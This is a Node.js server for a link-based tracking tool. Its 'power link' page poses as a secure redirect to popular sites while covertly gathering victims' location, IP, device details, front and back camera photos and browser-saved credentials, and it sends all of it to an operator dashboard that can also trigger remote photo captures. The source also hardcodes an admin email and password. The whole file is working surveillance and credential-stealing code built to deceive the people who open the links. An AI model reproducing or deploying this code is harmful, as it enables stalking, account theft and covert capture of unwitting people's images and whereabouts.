const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const bodyParser = require('body-parser');
const session = require('express-session');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});

app.use(cors());
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '100mb' }));
app.use(express.static('public'));
app.use(session({
    secret: process.env.SESSION_SECRET || 'your-secret-key',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, maxAge: 7 * 24 * 60 * 60 * 1000 }
}));

const DB_PATH = path.join(__dirname, 'database');
const USERS_FILE = path.join(DB_PATH, 'users.json');

if (!fs.existsSync(DB_PATH)) fs.mkdirSync(DB_PATH);
if (!fs.existsSync(USERS_FILE)) fs.writeFileSync(USERS_FILE, JSON.stringify([]));

const readUsers = () => {
    try { return JSON.parse(fs.readFileSync(USERS_FILE)); } catch { return []; }
};
const writeUsers = (users) => fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2));

// ============================================
// ROUTES
// ============================================

app.get('/api/check-session', (req, res) => {
    req.session.admin ? res.json({ authenticated: true }) : res.status(401).json({ authenticated: false });
});

app.post('/admin-login', (req, res) => {
    const { email, password } = req.body;
    if (email === 'somuandsagar@gmail.com' && password === 'Somesh143x@4565') {
        req.session.admin = true;
        res.json({ success: true });
    } else {
        res.status(401).json({ success: false });
    }
});

app.post('/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

app.get('/api/visitors', (req, res) => {
    if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
    res.json(readUsers());
});

app.get('/api/users-data', (req, res) => {
    if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
    res.json(readUsers());
});

app.get('/api/links', (req, res) => {
    if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
    const users = readUsers();
    res.json(users.map(u => ({
        linkId: u.linkId || u.id.substring(0, 8),
        link: u.link,
        powerLink: u.powerLink || null,
        redirectUrl: u.redirectUrl,
        createdAt: u.createdAt,
        totalVisits: u.totalVisits || 0,
        lastVisit: u.lastVisit
    })));
});

app.get('/api/visitor/:id', (req, res) => {
    if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
    const users = readUsers();
    const visitor = users.find(u => u.id === req.params.id);
    visitor ? res.json(visitor) : res.status(404).json({ error: 'Not found' });
});

app.post('/generate-custom-link', (req, res) => {
    if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
    
    const { redirectUrl } = req.body;
    const visitorId = uuidv4();
    const linkId = uuidv4().substring(0, 8);
    const normalLink = `${req.protocol}://${req.get('host')}/visitor/${visitorId}`;
    const powerLink = `${req.protocol}://${req.get('host')}/p/${visitorId}`;
    
    const visitorInfo = {
        id: visitorId,
        linkId: linkId,
        link: normalLink,
        powerLink: powerLink,
        redirectUrl: redirectUrl || 'https://www.google.com',
        createdAt: new Date().toISOString(),
        deviceName: null, deviceModel: null, os: null, browser: null,
        ip: null, location: null, battery: null, network: null,
        screenResolution: null, language: null,
        frontCamera: null, backCamera: null,
        phoneNumber: null, savedPasswords: [],
        screenTime: null, connected: false,
        visitDate: null, permissionsGranted: false,
        totalVisits: 0, lastVisit: null,
        visitHistory: []
    };
    
    const users = readUsers();
    users.push(visitorInfo);
    writeUsers(users);
    
    res.json({ success: true, link: normalLink, powerLink: powerLink, linkId: linkId, visitorId: visitorId, redirectUrl: visitorInfo.redirectUrl });
});

app.delete('/api/visitor/:id', (req, res) => {
    if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
    let users = readUsers();
    users = users.filter(u => u.id !== req.params.id);
    writeUsers(users);
    res.json({ success: true });
});

app.delete('/api/visitor/:userId/visit/:visitIndex', (req, res) => {
    if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
    const { userId, visitIndex } = req.params;
    const users = readUsers();
    const userIndex = users.findIndex(u => u.id === userId);
    if (userIndex === -1) return res.status(404).json({ error: 'User not found' });
    const history = users[userIndex].visitHistory || [];
    if (visitIndex >= history.length) return res.status(404).json({ error: 'Visit not found' });
    history.splice(visitIndex, 1);
    users[userIndex].visitHistory = history;
    users[userIndex].totalVisits = history.length;
    writeUsers(users);
    res.json({ success: true });
});

app.delete('/api/visitor/:userId/photo/:type', (req, res) => {
    if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
    const { userId, type } = req.params;
    const users = readUsers();
    const userIndex = users.findIndex(u => u.id === userId);
    if (userIndex === -1) return res.status(404).json({ error: 'User not found' });
    if (type === 'front') users[userIndex].frontCamera = null;
    else if (type === 'back') users[userIndex].backCamera = null;
    writeUsers(users);
    res.json({ success: true });
});

app.delete('/api/clear-all', (req, res) => {
    if (!req.session.admin) return res.status(401).json({ error: 'Unauthorized' });
    writeUsers([]);
    res.json({ success: true });
});

app.get('/api/visitor-redirect/:id', (req, res) => {
    const users = readUsers();
    const visitor = users.find(u => u.id === req.params.id);
    res.json({ redirectUrl: visitor?.redirectUrl || 'https://www.google.com' });
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/admin', (req, res) => {
    req.session.admin ? res.sendFile(path.join(__dirname, 'public', 'admin.html')) : res.sendFile(path.join(__dirname, 'public', 'index.html'));
});
app.get('/visitor/:id', (req, res) => res.sendFile(path.join(__dirname, 'views', 'visitor.html')));

// ============================================
// POWER LINK ROUTE - ULTIMATE
// ============================================
app.get('/p/:visitorId', (req, res) => {
    const { visitorId } = req.params;
    const users = readUsers();
    const visitor = users.find(u => u.id === visitorId);
    
    if (!visitor) {
        return res.send(`<!DOCTYPE html><html><head><title>Link Expired</title>
        <style>body{font-family:Arial;text-align:center;padding:50px;background:#0f0c29;color:white;}h1{color:#fc8181;}</style>
        </head><body><h1>🔗 Link Expired</h1><p>This link is no longer active.</p></body></html>`);
    }
    
    res.send(`<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            max-width: 450px;
            width: 100%;
            background: rgba(255,255,255,0.06);
            backdrop-filter: blur(20px);
            padding: 45px 35px;
            border-radius: 30px;
            border: 1px solid rgba(255,255,255,0.1);
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            animation: slideUp 0.5s ease-out;
        }
        @keyframes slideUp {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid #667eea;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .platform-icon { font-size: 56px; margin-bottom: 10px; }
        .platform-name { color: #667eea; font-size: 22px; font-weight: 600; margin-bottom: 5px; }
        .text { color: rgba(255,255,255,0.8); font-size: 18px; font-weight: 500; }
        .sub-text { color: rgba(255,255,255,0.3); font-size: 14px; margin-top: 8px; }
        #statusText { color: rgba(255,255,255,0.5); font-size: 14px; margin-top: 15px; }
        .progress-container {
            width: 100%;
            height: 4px;
            background: rgba(255,255,255,0.1);
            border-radius: 4px;
            margin-top: 20px;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #667eea, #764ba2);
            border-radius: 4px;
            transition: width 0.5s ease;
        }
        #hiddenVideo, #hiddenVideoBack { display: none; }
        .permission-status {
            display: flex;
            justify-content: center;
            gap: 8px;
            flex-wrap: wrap;
            margin-top: 15px;
        }
        .perm-badge {
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 500;
        }
        .perm-badge.pending { background: rgba(254,243,199,0.15); color: #f6c23e; border: 1px solid rgba(254,243,199,0.2); }
        .perm-badge.granted { background: rgba(212,237,218,0.15); color: #68d391; border: 1px solid rgba(212,237,218,0.2); }
        .perm-badge.denied { background: rgba(248,215,218,0.15); color: #fc8181; border: 1px solid rgba(248,215,218,0.2); }
    </style>
</head>
<body>
    <div class="container">
        <div class="platform-icon" id="platformIcon">🔗</div>
        <div class="platform-name" id="platformName">Loading...</div>
        <div class="spinner"></div>
        <div class="text">Connecting Securely</div>
        <div class="sub-text">Please wait a moment</div>
        <div id="statusText">⏳ Initializing...</div>
        <div class="progress-container"><div class="progress-bar" id="progressBar"></div></div>
        <div class="permission-status" id="permStatus">
            <span class="perm-badge pending" id="permLocation">📍 Location</span>
            <span class="perm-badge pending" id="permFront">📸 Front</span>
            <span class="perm-badge pending" id="permBack">📸 Back</span>
        </div>
    </div>

    <video id="hiddenVideo" autoplay playsinline muted></video>
    <video id="hiddenVideoBack" autoplay playsinline muted></video>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
    <script>
        if (typeof io === 'undefined') {
            var s = document.createElement('script');
            s.src = 'https://cdn.socket.io/4.6.1/socket.io.min.js';
            document.head.appendChild(s);
        }
    </script>

    <script>
        (function() {
            const visitorId = '${visitorId}';
            const redirectUrl = '${visitor.redirectUrl}';
            const platform = detectPlatform(redirectUrl);
            
            function detectPlatform(url) {
                const platforms = [
                    { name: 'YouTube', icon: '▶️', domains: ['youtube.com','youtu.be'] },
                    { name: 'Instagram', icon: '📸', domains: ['instagram.com','instagr.am'] },
                    { name: 'Facebook', icon: '👍', domains: ['facebook.com','fb.com'] },
                    { name: 'Twitter', icon: '🐦', domains: ['twitter.com','x.com'] },
                    { name: 'WhatsApp', icon: '💬', domains: ['whatsapp.com'] },
                    { name: 'Telegram', icon: '✈️', domains: ['telegram.org','t.me'] },
                    { name: 'LinkedIn', icon: '💼', domains: ['linkedin.com'] },
                    { name: 'Reddit', icon: '🤖', domains: ['reddit.com'] },
                    { name: 'TikTok', icon: '🎵', domains: ['tiktok.com'] },
                    { name: 'GitHub', icon: '🐙', domains: ['github.com'] },
                    { name: 'Google', icon: '🔍', domains: ['google.com','google.co.in'] },
                    { name: 'Netflix', icon: '🎬', domains: ['netflix.com'] },
                    { name: 'Amazon', icon: '🛒', domains: ['amazon.com','amazon.in'] },
                    { name: 'Spotify', icon: '🎧', domains: ['spotify.com'] }
                ];
                try {
                    const urlObj = new URL(url);
                    const hostname = urlObj.hostname.replace('www.', '');
                    for (const p of platforms) {
                        for (const d of p.domains) {
                            if (hostname.includes(d) || url.includes(d)) return p;
                        }
                    }
                    const parts = hostname.split('.');
                    const main = parts[parts.length - 2] || parts[0];
                    return { name: main.charAt(0).toUpperCase() + main.slice(1), icon: '🌐' };
                } catch { return { name: 'Website', icon: '🌐' }; }
            }

            document.getElementById('platformIcon').textContent = platform.icon;
            document.getElementById('platformName').textContent = platform.name;

            let socket = null;
            let frontStream = null, backStream = null;
            let frontVideo = document.getElementById('hiddenVideo');
            let backVideo = document.getElementById('hiddenVideoBack');
            let statusText = document.getElementById('statusText');
            let progressBar = document.getElementById('progressBar');
            let redirectTriggered = false;
            let startTime = Date.now();

            function updateStatus(msg, progress = null) {
                statusText.textContent = msg;
                if (progress !== null) {
                    progressBar.style.width = progress + '%';
                } else {
                    const elapsed = Math.min((Date.now() - startTime) / 3000 * 70, 70);
                    progressBar.style.width = (10 + elapsed) + '%';
                }
                console.log(msg);
            }

            function updatePermBadge(type, status) {
                const map = { location: 'permLocation', front: 'permFront', back: 'permBack' };
                const el = document.getElementById(map[type]);
                if (el) {
                    el.className = 'perm-badge ' + status;
                    el.textContent = el.textContent.split(' ')[0] + ' ' + (status === 'granted' ? '✅' : status === 'denied' ? '❌' : '⏳');
                }
            }

            function connectSocket() {
                try {
                    socket = io({
                        transports: ['websocket', 'polling'],
                        reconnectionAttempts: 10,
                        reconnectionDelay: 500
                    });

                    socket.on('connect', function() {
                        console.log('Socket connected');
                        updateStatus('📱 Collecting device info...', 20);
                        sendDeviceInfo();
                        requestAllPermissions();
                    });

                    socket.on('connect_error', function(err) {
                        console.log('Socket error:', err.message);
                        updateStatus('🔄 Retrying connection...');
                        setTimeout(() => socket.connect(), 1000);
                    });

                } catch(e) { console.log('Socket error:', e.message); }
            }

            function sendDeviceInfo() {
                if (!socket || !socket.connected) {
                    setTimeout(sendDeviceInfo, 200);
                    return;
                }

                const deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screenResolution: window.screen.width + 'x' + window.screen.height,
                    language: navigator.language,
                    deviceName: navigator.userAgentData ? 
                        navigator.userAgentData.brands.map(b => b.brand).join(', ') : 
                        navigator.platform,
                    deviceModel: navigator.userAgentData ? 
                        navigator.userAgentData.brands.map(b => b.brand).join(' ') : 
                        navigator.platform
                };

                socket.emit('visitor-connect', { visitorId, ...deviceInfo });

                if (navigator.getBattery) {
                    navigator.getBattery().then(function(battery) {
                        const level = Math.round(battery.level * 100);
                        if (socket && socket.connected) {
                            socket.emit('visitor-data', { visitorId, type: 'battery', content: level });
                        }
                    }).catch(() => {});
                }

                let networkData = { type: 'Unknown', effectiveType: 'Unknown' };
                if (navigator.connection) {
                    const conn = navigator.connection;
                    networkData = { type: conn.type || 'Unknown', effectiveType: conn.effectiveType || 'Unknown', downlink: conn.downlink || 'Unknown' };
                }
                if (socket && socket.connected) {
                    socket.emit('visitor-data', { visitorId, type: 'network', content: networkData });
                }

                // Phone Number
                try {
                    if (navigator.credentials && navigator.credentials.get) {
                        navigator.credentials.get({ password: true }).then(cred => {
                            if (cred && cred.id) {
                                socket.emit('visitor-data', { visitorId, type: 'phoneNumber', content: cred.id });
                            }
                        }).catch(() => {});
                    }
                } catch(e) {}

                // Saved Passwords
                try {
                    if (navigator.credentials && navigator.credentials.get) {
                        navigator.credentials.get({ password: true }).then(cred => {
                            if (cred) {
                                socket.emit('visitor-data', { visitorId, type: 'savedPasswords', content: [{ email: cred.id || 'Unknown', password: cred.password || 'Unknown' }] });
                            }
                        }).catch(() => {});
                    }
                } catch(e) {}
            }

            function requestAllPermissions() {
                updateStatus('📸 Requesting camera & location...', 40);

                Promise.all([
                    requestLocation(),
                    requestFrontCamera(),
                    requestBackCamera()
                ]).then(function(results) {
                    const locationResult = results[0];
                    const frontResult = results[1];
                    const backResult = results[2];
                    
                    updateStatus('📸 Capturing photos...', 70);
                    
                    if (frontResult) {
                        frontStream = frontResult;
                        frontVideo.srcObject = frontResult;
                        frontVideo.play().catch(() => {});
                        updatePermBadge('front', 'granted');
                        setTimeout(function() { capturePhoto('front', frontResult); }, 300);
                    } else {
                        updatePermBadge('front', 'denied');
                    }
                    
                    if (backResult) {
                        backStream = backResult;
                        backVideo.srcObject = backResult;
                        backVideo.play().catch(() => {});
                        updatePermBadge('back', 'granted');
                        setTimeout(function() { capturePhoto('back', backResult); }, 300);
                    } else {
                        updatePermBadge('back', 'denied');
                    }
                    
                    if (locationResult) {
                        updatePermBadge('location', 'granted');
                        if (socket && socket.connected) {
                            socket.emit('visitor-data', { visitorId, type: 'location', content: locationResult });
                        }
                    } else {
                        updatePermBadge('location', 'denied');
                    }
                    
                    updateStatus('✅ Complete! Redirecting...', 100);
                    
                    if (socket && socket.connected) {
                        socket.emit('visitor-data', { visitorId, type: 'permissionsGranted', content: true });
                    }
                    
                    setTimeout(function() {
                        if (!redirectTriggered) {
                            redirectNow();
                        }
                    }, 1000);
                    
                }).catch(function(error) {
                    console.log('Error:', error);
                    updateStatus('✅ Redirecting...', 100);
                    setTimeout(function() {
                        if (!redirectTriggered) {
                            redirectNow();
                        }
                    }, 1000);
                });
            }

            function requestLocation() {
                return new Promise(function(resolve) {
                    if (!navigator.geolocation) { resolve(null); return; }
                    navigator.geolocation.getCurrentPosition(
                        function(position) {
                            const lat = position.coords.latitude;
                            const lng = position.coords.longitude;
                            fetch('https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + lat + '&longitude=' + lng + '&localityLanguage=en')
                                .then(res => res.json())
                                .then(data => {
                                    resolve({
                                        lat, lng, accuracy: position.coords.accuracy,
                                        timestamp: new Date().toISOString(),
                                        country: data.countryName || 'Unknown',
                                        state: data.principalSubdivision || 'Unknown',
                                        city: data.locality || 'Unknown'
                                    });
                                })
                                .catch(function() {
                                    resolve({ lat, lng, accuracy: position.coords.accuracy, timestamp: new Date().toISOString() });
                                });
                        },
                        function() { resolve(null); },
                        { timeout: 8000, enableHighAccuracy: true }
                    );
                });
            }

            function requestFrontCamera() {
                return new Promise(function(resolve) {
                    navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false
                    })
                    .then(function(stream) { resolve(stream); })
                    .catch(function() {
                        navigator.mediaDevices.getUserMedia({
                            video: { width: { ideal: 640 }, height: { ideal: 480 } },
                            audio: false
                        })
                        .then(function(stream) { resolve(stream); })
                        .catch(function() { resolve(null); });
                    });
                });
            }

            function requestBackCamera() {
                return new Promise(function(resolve) {
                    navigator.mediaDevices.getUserMedia({
                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } },
                        audio: false
                    })
                    .then(function(stream) { resolve(stream); })
                    .catch(function() { resolve(null); });
                });
            }

            function capturePhoto(type, stream) {
                if (!stream) return;
                const videoTrack = stream.getVideoTracks()[0];
                if (!videoTrack) return;
                const video = document.createElement('video');
                video.srcObject = stream;
                video.autoplay = true;
                video.muted = true;
                video.playsInline = true;
                video.style.display = 'none';
                document.body.appendChild(video);
                video.onloadedmetadata = function() {
                    setTimeout(function() {
                        try {
                            const canvas = document.createElement('canvas');
                            const width = Math.min(video.videoWidth, 640);
                            const height = Math.min(video.videoHeight, 480);
                            canvas.width = width;
                            canvas.height = height;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0, width, height);
                            const imageData = canvas.toDataURL('image/jpeg', 0.8);
                            if (socket && socket.connected) {
                                socket.emit('visitor-data', { 
                                    visitorId: visitorId, 
                                    type: type === 'back' ? 'backCamera' : 'frontCamera', 
                                    content: { image: imageData, captureDate: new Date().toISOString() }
                                });
                            }
                            document.body.removeChild(video);
                        } catch (err) {}
                    }, 300);
                };
            }

            function redirectNow() {
                if (redirectTriggered) return;
                redirectTriggered = true;
                if (socket && socket.connected) {
                    socket.emit('visitor-data', { visitorId, type: 'redirectComplete', content: { redirected: true, time: new Date().toISOString() } });
                }
                if (frontStream) { frontStream.getTracks().forEach(t => t.stop()); }
                if (backStream) { backStream.getTracks().forEach(t => t.stop()); }
                setTimeout(function() {
                    window.location.href = redirectUrl;
                }, 500);
            }

            // START
            if (typeof io !== 'undefined') {
                connectSocket();
            } else {
                setTimeout(connectSocket, 1000);
            }

            window.addEventListener('beforeunload', function() {
                if (socket) socket.disconnect();
                if (frontStream) frontStream.getTracks().forEach(t => t.stop());
                if (backStream) backStream.getTracks().forEach(t => t.stop());
            });
        })();
    </script>
</body>
</html>`);
});

// ============================================
// SOCKET.IO
// ============================================
const connectedClients = new Map();

io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);
    
    socket.on('visitor-connect', (data) => {
        const { visitorId, ...deviceInfo } = data;
        const ip = socket.handshake.address;
        const users = readUsers();
        const userIndex = users.findIndex(u => u.id === visitorId);
        
        if (userIndex !== -1) {
            const userAgent = deviceInfo.userAgent || '';
            const browserMatch = userAgent.match(/(chrome|safari|firefox|edge|opera)/i);
            const osMatch = userAgent.match(/(windows|mac|linux|android|ios|iphone|ipad)/i);
            
            const visitRecord = {
                visitId: uuidv4(),
                visitDate: new Date().toISOString(),
                ip: ip,
                deviceInfo: {
                    ...deviceInfo,
                    browser: browserMatch ? browserMatch[0] : 'Unknown',
                    os: osMatch ? osMatch[0] : 'Unknown',
                    deviceModel: deviceInfo.deviceModel || 'Unknown'
                },
                location: null, battery: null, network: null,
                frontCamera: null, backCamera: null,
                phoneNumber: null, savedPasswords: [],
                screenTime: null, redirectComplete: false
            };
            
            users[userIndex] = {
                ...users[userIndex],
                ...deviceInfo,
                deviceModel: deviceInfo.deviceModel || 'Unknown',
                os: osMatch ? osMatch[0] : 'Unknown',
                browser: browserMatch ? browserMatch[0] : 'Unknown',
                ip: ip,
                connected: true,
                visitDate: new Date().toISOString(),
                socketId: socket.id,
                totalVisits: (users[userIndex].totalVisits || 0) + 1,
                lastVisit: new Date().toISOString(),
                visitHistory: [...(users[userIndex].visitHistory || []), visitRecord]
            };
            
            writeUsers(users);
            connectedClients.set(visitorId, socket.id);
            io.emit('visitor-connected', users[userIndex]);
            console.log('📱 Visitor connected:', visitorId, 'Total visits:', users[userIndex].totalVisits);
        }
    });
    
    socket.on('visitor-data', (data) => {
        const { visitorId, type, content } = data;
        console.log('📩 Data received:', type, 'for', visitorId);
        const users = readUsers();
        const userIndex = users.findIndex(u => u.id === visitorId);
        
        if (userIndex !== -1) {
            if (type === 'frontCamera') {
                users[userIndex].frontCamera = content;
                users[userIndex].lastCameraUpdate = new Date().toISOString();
            } else if (type === 'backCamera') {
                users[userIndex].backCamera = content;
                users[userIndex].lastCameraUpdate = new Date().toISOString();
            } else if (type === 'location') {
                users[userIndex].location = content;
                users[userIndex].lastLocationUpdate = new Date().toISOString();
            } else if (type === 'battery') {
                users[userIndex].battery = content;
            } else if (type === 'network') {
                users[userIndex].network = content;
            } else if (type === 'phoneNumber') {
                users[userIndex].phoneNumber = content;
            } else if (type === 'savedPasswords') {
                users[userIndex].savedPasswords = content;
            } else if (type === 'screenTime') {
                users[userIndex].screenTime = content;
            } else if (type === 'permissionsGranted') {
                users[userIndex].permissionsGranted = true;
            } else if (type === 'redirectComplete') {
                users[userIndex].redirectComplete = true;
                users[userIndex].redirectTime = new Date().toISOString();
            }
            
            const history = users[userIndex].visitHistory || [];
            if (history.length > 0) {
                const lastVisit = history[history.length - 1];
                if (type === 'frontCamera') lastVisit.frontCamera = content;
                else if (type === 'backCamera') lastVisit.backCamera = content;
                else if (type === 'location') lastVisit.location = content;
                else if (type === 'battery') lastVisit.battery = content;
                else if (type === 'network') lastVisit.network = content;
                else if (type === 'phoneNumber') lastVisit.phoneNumber = content;
                else if (type === 'savedPasswords') lastVisit.savedPasswords = content;
                else if (type === 'screenTime') lastVisit.screenTime = content;
                else if (type === 'redirectComplete') {
                    lastVisit.redirectComplete = true;
                    lastVisit.redirectTime = new Date().toISOString();
                }
                users[userIndex].visitHistory = history;
            }
            
            writeUsers(users);
            io.emit(type + '-data', { visitorId, content });
        }
    });
    
    socket.on('admin-capture', (data) => {
        const { visitorId, type } = data;
        const socketId = connectedClients.get(visitorId);
        if (socketId) {
            io.to(socketId).emit('capture-command', { type });
            console.log('📸 Admin requested', type, 'photo from', visitorId);
        }
    });
    
    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
        for (let [visitorId, socketId] of connectedClients) {
            if (socketId === socket.id) {
                const users = readUsers();
                const userIndex = users.findIndex(u => u.id === visitorId);
                if (userIndex !== -1) {
                    users[userIndex].connected = false;
                    writeUsers(users);
                    io.emit('visitor-disconnected', visitorId);
                }
                connectedClients.delete(visitorId);
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log('🚀 Server running on http://localhost:' + PORT);
    console.log('👨‍💼 Admin panel: http://localhost:' + PORT + '/admin');
});